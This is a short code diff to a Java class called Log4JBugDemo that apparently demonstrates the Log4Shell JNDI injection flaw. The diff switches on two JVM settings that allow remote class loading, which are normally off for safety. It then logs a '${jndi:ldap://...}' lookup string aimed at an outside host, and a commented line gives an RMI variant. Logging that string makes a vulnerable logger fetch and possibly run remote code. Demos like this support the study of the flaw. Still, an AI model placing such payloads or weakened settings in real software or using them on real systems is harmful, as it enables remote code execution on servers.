@@ -29,10 +29,11 @@ public class Log4JBugDemo {
 //            e.printStackTrace();
 //        }
 
-//        System.setProperty("java.rmi.server.useCodebaseOnly", "false");
-//        System.setProperty("com.sun.jndi.rmi.object.trustURLCodebase", "true");
+        System.setProperty("java.rmi.server.useCodebaseOnly", "false");
+        System.setProperty("com.sun.jndi.rmi.object.trustURLCodebase", "true");
 
-        String target = "${jndi:ldap://172.16.2.113:1389/cvywm1}";
+        String target = "${jndi:ldap://172.16.2.113:1389/d0c7la}";
+//        String target = "${jndi:rmi://172.16.2.113:1389/d0c7la}";
         logger.error("test log4j bug ... 1");
         logger.error("params : {}" , target);
         logger.error("test log4j bug ... 3");
